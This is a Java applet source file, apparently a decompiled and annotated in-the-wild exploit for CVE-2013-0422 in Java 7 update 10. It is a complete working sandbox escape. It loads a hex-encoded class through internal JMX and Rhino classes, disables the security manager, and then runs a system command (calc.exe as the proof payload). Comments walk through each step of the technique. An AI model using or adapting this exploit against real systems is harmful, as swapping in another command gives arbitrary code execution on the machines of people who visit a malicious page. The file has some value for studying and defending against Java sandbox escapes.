/*
  Java 0day 1.7.0_10 decrypted source
  Originally placed on https://damagelab.org/index.php?showtopic=23719&st=0
  From Russia with love.
*/

import java.applet.Applet;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;

import com.sun.jmx.mbeanserver.JmxMBeanServer;
import com.sun.jmx.mbeanserver.JmxMBeanServerBuilder;
import com.sun.jmx.mbeanserver.MBeanInstantiator;

// Decompiled exploit found in the wild for CVE-2013-0422
// Source modified (formatting/style/commenting) from https://gist.github.com/anonymous/4509036
// Additional discussion on https://www.reddit.com/r/netsec/comments/16buer/source_code_for_the_java_7_0day/
public class Exploit extends Applet {

	private static final long serialVersionUID = 1L;

	public static byte[] hex2Byte(String inputString) {
		byte[] byteArray = new byte[inputString.length() / 2];
		for (int i = 0; i < byteArray.length; i++) {
			byteArray[i] = (byte) Integer.parseInt(inputString.substring(2 * i, 2 * i + 2), 16);
		}
		return byteArray;
	}

	public static byte[] classBBytes = hex2Byte("CAFEBABE0000003200270A000500180A0019001A07001B0A001C001D07001E07001F0700200100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010001650100154C6A6176612F6C616E672F457863657074696F6E3B010004746869730100034C423B01000D537461636B4D61705461626C6507001F07001B01000372756E01001428294C6A6176612F6C616E672F4F626A6563743B01000A536F7572636546696C65010006422E6A6176610C000800090700210C002200230100136A6176612F6C616E672F457863657074696F6E0700240C002500260100106A6176612F6C616E672F4F626A656374010001420100276A6176612F73656375726974792F50726976696C65676564457863657074696F6E416374696F6E01001E6A6176612F73656375726974792F416363657373436F6E74726F6C6C657201000C646F50726976696C6567656401003D284C6A6176612F73656375726974792F50726976696C65676564457863657074696F6E416374696F6E3B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01001273657453656375726974794D616E6167657201001E284C6A6176612F6C616E672F53656375726974794D616E616765723B295600210006000500010007000000020001000800090001000A0000006C000100020000000E2AB700012AB8000257A700044CB1000100040009000C00030003000B000000120004000000080004000B0009000C000D000D000C000000160002000D0000000D000E00010000000E000F001000000011000000100002FF000C00010700120001070013000001001400150001000A0000003A000200010000000C01B80004BB000559B70001B000000002000B0000000A00020000001000040011000C0000000C00010000000C000F0010000000010016000000020017");
	
	// Decompilation credit to benmmurphy
	// http://www.reddit.com/r/netsec/comments/16b4n1/0day_exploit_fo_java_17u10_spotted_in_the_wild/c7ulpd7
	// basically, it's this, as if this were compiled and saved on disk.
//	static class B implements PrivilegedExceptionAction<Object> {
//		public B() {
//			try {
//				AccessController.doPrivileged(this);
//			} catch (Exception e) {
//			}
//		}
//
//		public Object run() {
//			// This basically removes the security manager
//			System.setSecurityManager(null);
//			return new Object();
//		}
//	}
	

	@SuppressWarnings("rawtypes")
	@Override
	public void init() {
		try {
			// ================================================================
			// STEP 0: get introspection objects

			// Conveniences
			ClassLoader nullClassLoader = null;
			Object[] noArgs = {};

			// "Returns a lookup object which is trusted minimally.
			// It can only be used to create method handles to publicly accessible fields and methods."
			MethodHandles.Lookup lookup = MethodHandles.publicLookup();

			// Used to load the "sun.org.mozilla.javascript.internal.*" classes
			// Looks like these classes load some normally inaccessible
			// libraries. Can't find any good documentation on them.
			MBeanInstantiator beanInstantiator = ((JmxMBeanServer) new JmxMBeanServerBuilder().newMBeanServer("", null, null)).getMBeanInstantiator();

			// Used to invoke reflection on the javascript classes
			// method type: MethodHandle <method> (Class, String, MethodType)
			MethodType methodHandleClassStringMethodType = MethodType.methodType(MethodHandle.class, Class.class, new Class[] {String.class, MethodType.class });

			// MethodHandles.Lookup.findVirtual(Class, String, MethodType)
			MethodHandle findVirtualMethodHandle = lookup.findVirtual(MethodHandles.Lookup.class, "findVirtual", methodHandleClassStringMethodType);

			// method type: MethodHandle <method> (Class, MethodType)
			MethodType methodHandleClassMethodType = MethodType.methodType(MethodHandle.class, Class.class, new Class[] { MethodType.class });

			// MethodHandles.Lookup.findConstructor(Class, MethodType)
			MethodHandle lookupFindConstructorMethodHandle = lookup.findVirtual(MethodHandles.Lookup.class, "findConstructor", methodHandleClassMethodType);

			// ================================================================
			// STEP 1: Load the GeneratedClassLoader interface that declares a
			// public "defineClass" method so we can take our bytes and turn it into a live Java Class.
			Class generatedClassLoaderClass = beanInstantiator.findClass("sun.org.mozilla.javascript.internal.GeneratedClassLoader", nullClassLoader);

			// ================================================================
			// STEP 2: Create a Javascript "Context" to get a reference to a
			// Javascript GeneratedClassLoader via "Context.createClassLoader(ClassLoader)".
			Class contextClass = beanInstantiator.findClass("sun.org.mozilla.javascript.internal.Context", nullClassLoader);
			MethodType voidMethodType = MethodType.methodType(Void.TYPE);
			MethodHandle contextContext = (MethodHandle) lookupFindConstructorMethodHandle.invokeWithArguments(new Object[] { lookup, contextClass, voidMethodType });
			Object jsContext = contextContext.invokeWithArguments(noArgs);

			// ================================================================
			// STEP 3: Create a GeneratedClassLoader object.
			MethodType generatedClassLoaderMethodType = MethodType.methodType(generatedClassLoaderClass, ClassLoader.class);
			MethodHandle createClassLoaderMethodHandle = (MethodHandle) findVirtualMethodHandle.invokeWithArguments(new Object[] { lookup, contextClass, "createClassLoader", generatedClassLoaderMethodType });
			Object generatedClassLoader = createClassLoaderMethodHandle.invokeWithArguments(new Object[] { jsContext, null });

			// ================================================================
			// STEP 4: Define the class "B" - the bytes of "classBBytes" is
			// basically what you would get "on disk" if you compiled the "B" class.
			MethodType stringByteArrayMethodType = MethodType.methodType(Class.class, String.class, new Class[] { byte[].class });
			MethodHandle defineClassMethodHandle = (MethodHandle) findVirtualMethodHandle.invokeWithArguments(new Object[] { lookup, generatedClassLoaderClass, "defineClass", stringByteArrayMethodType });
			Class classBInstance = (Class) defineClassMethodHandle.invokeWithArguments(new Object[] { generatedClassLoader, null, classBBytes });

			// ================================================================
			// STEP 5: Create a new "B" object, which disables the security manager in it's constructor
			classBInstance.newInstance();

			// ================================================================
			// PROFIT!!!1!
			Runtime.getRuntime().exec("calc.exe");
		} catch (Throwable e) {
			e.printStackTrace();
		}
	}

}